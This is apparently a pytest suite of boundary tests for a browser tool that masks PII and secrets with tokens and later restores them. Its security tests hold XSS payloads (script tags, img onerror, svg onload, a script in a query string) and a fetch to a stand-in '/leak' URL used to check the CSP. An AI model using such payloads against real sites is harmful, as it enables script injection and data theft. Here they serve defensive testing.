"""Tier 2: Boundary & Corner Cases (45 Tests: T2-F1-01..T2-F8-07)."""

from __future__ import annotations

from collections import Counter
import json
import re
import time
from typing import Any

import pytest

from conftest import E2ESession
from monitors import fetch_http_response


pytestmark = [pytest.mark.tier2]


def _t2_data(test_cases_data: dict[str, Any], case_id: str) -> dict[str, Any]:
    return dict(test_cases_data["tier2"][case_id])


# ---------------------------------------------------------------------------
# F1 Boundaries (15 Tests)
# ---------------------------------------------------------------------------


def test_T2_F1_01_empty_and_whitespace_input(e2e_session: E2ESession) -> None:
    out_empty = e2e_session.ui.sanitize_text("")
    assert out_empty == ""
    assert e2e_session.ui.get_vault_rows() == []
    out_ws = e2e_session.ui.sanitize_text("   \n\t  \n")
    assert out_ws.strip() == ""
    assert e2e_session.ui.get_vault_rows() == []

    # Clean SessionVault reset when manually cleared back to empty
    out_first = e2e_session.ui.sanitize_text("first@example.com")
    assert "[EMAIL_1]" in out_first
    assert len(e2e_session.ui.get_vault_rows()) == 1
    assert e2e_session.ui.sanitize_text("") == ""
    assert e2e_session.ui.get_vault_rows() == []
    out_second = e2e_session.ui.sanitize_text("second@example.com")
    assert "[EMAIL_1]" in out_second
    assert "[EMAIL_2]" not in out_second


def test_T2_F1_02_oversized_input_55kb_performance(e2e_session: E2ESession) -> None:
    payload = "start@example.com " + ("Lorem ipsum dolor sit amet. " * 2000) + " DE89 3704 0044 0532 0130 00"
    assert len(payload) > 55_000
    t0 = time.monotonic()
    out = e2e_session.ui.sanitize_text(payload, wait_ms=2500)
    elapsed = time.monotonic() - t0
    assert elapsed < 3.0, f"55KB scan took {elapsed:.2f}s (>= 3.0s)"
    assert "[EMAIL_1]" in out and "[IBAN_1]" in out
    assert "start@example.com" not in out


def test_T2_F1_03_invalid_luhn_vs_valid_luhn(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-03")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("CREDIT_CARD") == 2
    for valid in case["valid_values"]:
        assert valid not in out
    for invalid in case["invalid_values"]:
        assert invalid in out


def test_T2_F1_04_invalid_iban_mod97_vs_valid_iban(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-04")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("IBAN") == 1
    assert "[IBAN_1]" in out
    for valid in case["valid_values"]:
        assert valid not in out
    for invalid in case["invalid_values"]:
        assert invalid in out


def test_T2_F1_05_invalid_ssn_area_group_serial(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-05")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("SSN") == 1
    assert "[SSN_1]" in out
    for invalid in case["invalid_values"]:
        assert invalid in out


def test_T2_F1_06_dates_and_ips_not_flagged_as_phones(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-06")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("PHONE") == 0
    for d in case["literal_dates"]:
        assert d in out
    assert "[IP_1]" in out


def test_T2_F1_07_phone_digit_length_boundaries(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-07")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("PHONE") == 1
    assert "[PHONE_1]" in out
    assert case["valid_phone"] not in out
    for inv in case["invalid_phones"]:
        assert inv in out


def test_T2_F1_08_version_strings_and_invalid_octets_not_ipv4(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-08")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("IPV4") == 1
    assert "[IP_1]" in out
    assert case["valid_ip"] not in out
    for inv in case["invalid_ips"]:
        assert inv in out


def test_T2_F1_09_urls_paths_uuids_low_entropy_not_high_entropy(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-09")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("HIGH_ENTROPY") == 0
    assert "550e8400-e29b-41d4-a716-446655440000" in out
    assert "aaaaaaaaaaaaaaaaaaaaaaaa" in out


def test_T2_F1_10_env_placeholders_and_short_rhs_skipped(
    e2e_session: E2ESession, test_cases_data: dict[str, Any]
) -> None:
    case = _t2_data(test_cases_data, "T2-F1-10")
    out = e2e_session.ui.sanitize_text(case["input"])
    assert e2e_session.ui.get_category_chip_count("ENV_SECRET") == 1
    assert "[ENV_SECRET_1]" in out
    assert case["valid_secret"] not in out
    for skipped in case["skipped_values"]:
        assert skipped in out


def test_T2_F1_11_overlap_priority_api_key_over_env_and_entropy(e2e_session: E2ESession) -> None:
    out = e2e_session.ui.sanitize_text("OPENAI_API_KEY=sk-proj-TestSynthKey000111222333444")
    assert out.strip() == "OPENAI_API_KEY=[API_KEY_1]"
    assert e2e_session.ui.get_category_chip_count("HIGH_ENTROPY") == 0


def test_T2_F1_12_overlap_priority_jwt_over_high_entropy(e2e_session: E2ESession) -> None:
    out = e2e_session.ui.sanitize_text(
        "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyOTk5OSIsImF1ZCI6InByb2QifQ.v9Kp2mQx7Rt4Lz8Nw3Yc6Bf1"
    )
    assert out.strip() == "token=[JWT_1]"
    assert e2e_session.ui.get_category_chip_count("HIGH_ENTROPY") == 0


def test_T2_F1_13_overlap_priority_custom_over_email(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("vip@example.com")
    e2e_session.ui.close_open_drawer()
    out = e2e_session.ui.sanitize_text("vip@example.com")
    assert out.strip() == "[CUSTOM_1]"
    assert e2e_session.ui.get_category_chip_count("EMAIL") == 0


def test_T2_F1_14_cyrillic_unicode_word_boundary_edge_cases(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("Иван")
    e2e_session.ui.close_open_drawer()
    out = e2e_session.ui.sanitize_text("Иван и Иванов пришли в Иван-город.")
    assert "[CUSTOM_1]" in out
    assert "Иванов" in out


def test_T2_F1_15_longest_first_custom_rule_priority(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("Вектор")
    e2e_session.ui.add_custom_rule("ООО Вектор Плюс")
    e2e_session.ui.close_open_drawer()
    out = e2e_session.ui.sanitize_text("Контрагент ООО Вектор Плюс оплатил.")
    assert out.strip() == "Контрагент [CUSTOM_1] оплатил."
    custom_rows = [r for r in e2e_session.ui.get_vault_rows() if r.category == "CUSTOM"]
    assert len(custom_rows) == 1


# ---------------------------------------------------------------------------
# F2 Boundaries (5 Tests)
# ---------------------------------------------------------------------------


def test_T2_F2_01_email1_vs_email10_and_email11_non_collision(e2e_session: E2ESession) -> None:
    emails = [f"e{i}@example.com" for i in range(1, 12)]
    e2e_session.ui.sanitize_text(" ".join(emails))
    restored = e2e_session.ui.rehydrate_text("First [EMAIL_1], tenth [EMAIL_10], eleventh [EMAIL_11].")
    assert restored.strip() == "First e1@example.com, tenth e10@example.com, eleventh e11@example.com."


def test_T2_F2_02_literal_token_like_text_no_double_substitution(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("tag_[EMAIL_1]")
    e2e_session.ui.close_open_drawer()
    e2e_session.ui.sanitize_text("tag_[EMAIL_1] x@example.com")
    restored = e2e_session.ui.rehydrate_text("Item [CUSTOM_1] and [EMAIL_1].")
    assert restored.strip() == "Item tag_[EMAIL_1] and x@example.com."


def test_T2_F2_03_empty_reply_in_rehydrate(e2e_session: E2ESession) -> None:
    restored = e2e_session.ui.rehydrate_text("")
    assert restored == ""
    assert e2e_session.ui.get_unresolved_tokens() == []


def test_T2_F2_04_regex_metacharacters_in_restored_secret(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("API_PASSWORD=a$1$&b\\\\(c)d")
    restored = e2e_session.ui.rehydrate_text("Use [ENV_SECRET_1]")
    assert restored.strip() == "Use a$1$&b\\\\(c)d"


def test_T2_F2_05_multiple_distinct_unresolved_tokens(e2e_session: E2ESession) -> None:
    restored = e2e_session.ui.rehydrate_text("Check [EMAIL_99] and [API_KEY_42] and [CUSTOM_7].")
    assert "[EMAIL_99]" in restored
    assert "[API_KEY_42]" in restored
    assert "[CUSTOM_7]" in restored
    unresolved = e2e_session.ui.get_unresolved_tokens()
    assert {"[EMAIL_99]", "[API_KEY_42]", "[CUSTOM_7]"}.issubset(set(unresolved))


# ---------------------------------------------------------------------------
# F3 Boundaries (5 Tests)
# ---------------------------------------------------------------------------


def test_T2_F3_01_disable_all_categories_simultaneously(e2e_session: E2ESession) -> None:
    raw = "a@example.com +1 415 555 0199 192.0.2.1"
    e2e_session.ui.sanitize_text(raw)
    e2e_session.ui.toggle_category_chip("EMAIL")
    e2e_session.ui.toggle_category_chip("PHONE")
    e2e_session.ui.toggle_category_chip("IPV4")
    assert e2e_session.ui.get_sanitize_output_text().strip() == raw
    rows = e2e_session.ui.get_vault_rows()
    assert len(rows) == 3
    assert all(not r.enabled for r in rows)


def test_T2_F3_02_toggle_zero_count_category_chip(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("Email only a@example.com")
    assert e2e_session.ui.get_category_chip_count("IBAN") == 0

    page = e2e_session.page
    e2e_session.ui._expand_all_categories_if_needed("IBAN")
    chips_container = page.locator("[data-testid='category-chips']")
    iban_chip = page.locator("[data-testid='category-chips'] [data-category='IBAN' i]")
    toggle_all_btn = page.locator("[data-testid='toggle-all-categories-btn']")
    has_toggle_all = toggle_all_btn.count() > 0 and toggle_all_btn.first.is_visible()
    has_iban_chip = (iban_chip.count() > 0 and iban_chip.first.is_visible()) or (
        chips_container.count() == 0
    )

    if has_iban_chip or has_toggle_all:
        e2e_session.ui.toggle_category_chip("IBAN")
        assert e2e_session.ui.get_category_chip_count("IBAN") == 0
    else:
        assert all(not iban_chip.nth(i).is_visible() for i in range(iban_chip.count()))

    assert e2e_session.ui.get_category_chip_count("EMAIL") == 1
    assert e2e_session.ui.get_sanitize_output_text().strip() == "Email only [EMAIL_1]"


def test_T2_F3_03_toggle_one_occurrence_of_repeated_value(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("a@example.com, b@example.com, a@example.com")
    e2e_session.ui.toggle_vault_entity("a@example.com")
    assert e2e_session.ui.get_sanitize_output_text().strip() == "a@example.com, [EMAIL_2], a@example.com"


def test_T2_F3_04_entity_toggle_state_when_rescanning_edited_prompt(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("a@example.com b@example.com")
    e2e_session.ui.toggle_vault_entity("a@example.com")
    out = e2e_session.ui.sanitize_text("a@example.com b@example.com c@example.com")
    assert "[EMAIL_" in out
    assert len(e2e_session.ui.get_vault_rows()) >= 2


def test_T2_F3_05_rehydrate_behavior_with_disabled_entity(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("a@example.com b@example.com")
    e2e_session.ui.toggle_vault_entity("a@example.com")
    restored = e2e_session.ui.rehydrate_text("Sent to a@example.com and [EMAIL_2].")
    assert restored.strip() == "Sent to a@example.com and b@example.com."


# ---------------------------------------------------------------------------
# F4 Boundaries (5 Tests)
# ---------------------------------------------------------------------------


def test_T2_F4_01_empty_whitespace_custom_rule_rejected(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("")
    e2e_session.ui.add_custom_rule("   ")
    stored = e2e_session.page.evaluate("() => localStorage.getItem('promptveil_rules_v1') || '[]'")
    parsed = json.loads(stored)
    if isinstance(parsed, dict):
        rules = parsed.get("rules", parsed.get("items"))
        assert isinstance(rules, list), f"Unexpected dict schema in promptveil_rules_v1: {parsed!r}"
    elif isinstance(parsed, list):
        rules = parsed
    else:
        raise AssertionError(f"Unexpected type in promptveil_rules_v1: {type(parsed).__name__}")
    assert all(str(r.get("term", r) if isinstance(r, dict) else r).strip() for r in rules)


def test_T2_F4_02_duplicate_custom_rule_conflict(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("Acme Corp")
    e2e_session.ui.add_custom_rule("Acme Corp")
    drawer_txt = e2e_session.ui.get_rulebook_text()
    assert drawer_txt.count("Acme Corp") == 1


def test_T2_F4_03_regex_special_chars_in_custom_rule(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("C++ (v2.0) [Internal]")
    e2e_session.ui.close_open_drawer()
    out = e2e_session.ui.sanitize_text("Use C++ (v2.0) [Internal] today.")
    assert "[CUSTOM_1]" in out
    assert "C++ (v2.0) [Internal]" not in out


def test_T2_F4_04_malformed_json_import_rejected(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("KeepMeRule")
    bad_json = e2e_session.io.uploads / "bad.json"
    bad_json.write_text("{not valid json", encoding="utf-8")
    e2e_session.ui.import_rules_json(bad_json)
    drawer = e2e_session.ui.open_rulebook_drawer()
    assert e2e_session.ui.get_visible_error_notice(drawer) or e2e_session.ui.get_visible_error_notice(), (
        "Expected visible error notice for malformed JSON import"
    )
    bad_schema = e2e_session.io.uploads / "bad_schema.json"
    bad_schema.write_text('{"wrong": 123}', encoding="utf-8")
    e2e_session.ui.import_rules_json(bad_schema)
    assert e2e_session.ui.get_visible_error_notice(drawer) or e2e_session.ui.get_visible_error_notice(), (
        "Expected visible error notice for invalid schema JSON import"
    )
    assert "KeepMeRule" in e2e_session.ui.get_rulebook_text()


def test_T2_F4_05_import_json_duplicate_merge(e2e_session: E2ESession) -> None:
    e2e_session.ui.add_custom_rule("RuleA")
    e2e_session.ui.add_custom_rule("RuleB")
    exported = e2e_session.ui.export_rules_json(e2e_session.io.downloads)
    e2e_session.ui.delete_custom_rule("RuleB")
    e2e_session.ui.import_rules_json(exported)
    drawer_txt = e2e_session.ui.get_rulebook_text()
    assert drawer_txt.count("RuleA") == 1
    assert drawer_txt.count("RuleB") == 1


# ---------------------------------------------------------------------------
# F5 & F6 Boundaries (5 Tests)
# ---------------------------------------------------------------------------


def test_T2_F6_01_unsupported_file_extension_rejected(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("Safe existing text")
    bad_file = e2e_session.io.uploads / "dummy.png"
    bad_file.write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")
    e2e_session.ui.upload_file(bad_file)
    assert e2e_session.ui.get_prompt_input().input_value() == "Safe existing text"
    assert e2e_session.ui.get_visible_error_notice(), "Expected visible error notice for unsupported .png file"
    e2e_session.net.assert_zero_egress()


def test_T2_F6_02_empty_zero_byte_txt_file(e2e_session: E2ESession) -> None:
    empty_file = e2e_session.io.uploads / "empty.txt"
    empty_file.write_bytes(b"")
    e2e_session.ui.upload_file(empty_file)
    e2e_session.net.assert_zero_egress()


def test_T2_F6_03_utf8_cyrillic_non_ascii_filename_csv(e2e_session: E2ESession) -> None:
    csv_file = e2e_session.io.uploads / "отчёт_клиенты.csv"
    csv_file.write_text("ФИО,Телефон\nМария Соколова,+7 903 555 12 34", encoding="utf-8-sig")
    e2e_session.ui.upload_file(csv_file)
    out = e2e_session.ui.get_sanitize_output_text()
    assert "Мария Соколова,[PHONE_1]" in out
    assert "\ufffd" not in out


def test_T2_F6_04_large_local_log_file_60kb(e2e_session: E2ESession) -> None:
    chunk = "2026-11-19 INFO worker heartbeat ok\n" * 1700
    content = (
        "u1@example.com 192.0.2.10\n"
        + chunk
        + "u2@example.com 198.51.100.20 u3@example.com\n"
    )
    assert len(content.encode("utf-8")) > 60_000
    large_log = e2e_session.io.uploads / "large.log"
    large_log.write_text(content, encoding="utf-8")
    t0 = time.monotonic()
    e2e_session.ui.upload_file(large_log)
    elapsed = time.monotonic() - t0
    assert elapsed < 3.0
    out = e2e_session.ui.get_sanitize_output_text()
    assert "[EMAIL_1]" in out and "[EMAIL_3]" in out and "[IP_2]" in out
    e2e_session.net.assert_zero_egress()


def test_T2_F5_01_preset_reselection_after_user_edit(e2e_session: E2ESession) -> None:
    e2e_session.ui.select_preset("client_contract")
    first_prompt = e2e_session.ui.get_prompt_input().input_value()
    e2e_session.ui.sanitize_text("")
    assert e2e_session.ui.get_prompt_input().input_value() == ""
    e2e_session.ui.select_preset("client_contract")
    assert e2e_session.ui.get_prompt_input().input_value() == first_prompt


# ---------------------------------------------------------------------------
# F7 & F8 Boundaries (10 Tests)
# ---------------------------------------------------------------------------


def test_T2_F8_01_xss_script_in_prompt_and_output(e2e_session: E2ESession) -> None:
    out = e2e_session.ui.sanitize_text("<script>window.__xss=1;alert(1)</script> mail x@example.com")
    assert "<script>window.__xss=1;alert(1)</script>" in out
    assert "[EMAIL_1]" in out
    assert e2e_session.page.evaluate("() => window.__xss === undefined") is True


def test_T2_F8_02_xss_img_onerror_in_custom_rule_and_vault(e2e_session: E2ESession) -> None:
    payload = "<img src=x onerror=window.__xssImg=1>"
    e2e_session.ui.add_custom_rule(payload)
    e2e_session.ui.close_open_drawer()
    out = e2e_session.ui.sanitize_text(f"Ping {payload}")
    assert "[CUSTOM_1]" in out
    assert e2e_session.page.evaluate("() => document.querySelectorAll('img[src=\"x\"]').length") == 0
    assert e2e_session.page.evaluate("() => window.__xssImg === undefined") is True


def test_T2_F8_03_xss_payload_in_rehydrate_reply(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("x@example.com")
    restored = e2e_session.ui.rehydrate_text("<svg onload=window.__xssSvg=1>Hello [EMAIL_1]</svg>")
    assert "x@example.com" in restored
    assert e2e_session.page.evaluate("() => document.querySelectorAll('svg[onload]').length") == 0
    assert e2e_session.page.evaluate("() => window.__xssSvg === undefined") is True


def test_T2_F8_04_csp_blocks_external_fetch(e2e_session: E2ESession) -> None:
    with e2e_session.console.allow_expected_csp_errors():
        blocked = e2e_session.page.evaluate(
            """async () => {
                try {
                    await fetch('https://example.com/leak');
                    return false;
                } catch (err) {
                    return true;
                }
            }"""
        )
    assert blocked is True


def test_T2_F8_05_corrupted_localstorage_recovery(raw_session: E2ESession) -> None:
    raw_session.page.goto(f"{raw_session.base_url}/", wait_until="networkidle")
    raw_session.page.evaluate(
        """() => {
            localStorage.setItem('promptveil_rules_v1', '{broken');
            localStorage.setItem('promptveil_audit_v1', '{also_broken');
        }"""
    )
    raw_session.page.reload(wait_until="networkidle")
    assert raw_session.ui.get_prompt_input().is_visible()
    out = raw_session.ui.sanitize_text("Recover test@example.com")
    assert "[EMAIL_1]" in out


def test_T2_F7_01_audit_hash_determinism_and_distinctness(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("x@example.com")
    h1 = e2e_session.ui.get_audit_hashes()
    e2e_session.ui.close_open_drawer()
    e2e_session.ui.sanitize_text("x@example.com")
    h2 = e2e_session.ui.get_audit_hashes()
    e2e_session.ui.close_open_drawer()
    e2e_session.ui.sanitize_text("y@example.com")
    h3 = e2e_session.ui.get_audit_hashes()
    assert len(h1) >= 1 and len(h2) >= 2 and len(h3) >= 3
    c1 = Counter(h1)
    c2 = Counter(h2)
    # Same input processed twice increases occurrence frequency of its deterministic SHA-256 digest(s)
    assert any(c2[h] > c1[h] for h in c1), f"Expected recurring hash count increase: h1={h1}, h2={h2}"
    # Distinct input introduces at least one brand-new SHA-256 digest
    assert len(set(h3) - set(h2)) >= 1, f"Expected new distinct hash for y@example.com: h2={h2}, h3={h3}"


def test_T2_F7_02_audit_receipt_after_rehydrate_zero_raw_pii(e2e_session: E2ESession) -> None:
    e2e_session.ui.sanitize_text("SSN 123-45-6789")
    e2e_session.ui.rehydrate_text("OK [SSN_1]")
    stored = e2e_session.page.evaluate("() => localStorage.getItem('promptveil_audit_v1') || ''")
    assert "123-45-6789" not in stored
    assert re.search(r"[0-9a-f]{64}", stored, re.I) is not None


def test_T2_F7_03_clear_audit_log_idempotency(e2e_session: E2ESession) -> None:
    e2e_session.ui.clear_audit_log()
    e2e_session.ui.clear_audit_log()
    assert e2e_session.ui.get_audit_hashes() == []


def test_T2_F8_06_404_on_non_existent_static_path(raw_session: E2ESession) -> None:
    status, _, _ = fetch_http_response(f"{raw_session.base_url}/nonexistent-path-xyz")
    assert status == 404


def test_T2_F8_07_query_string_fragment_isolation(raw_session: E2ESession) -> None:
    raw_session.page.goto(
        f"{raw_session.base_url}/?utm_source=<script>alert(1)</script>",
        wait_until="networkidle",
    )
    assert raw_session.ui.get_prompt_input().is_visible()
    raw_session.console.assert_no_errors()
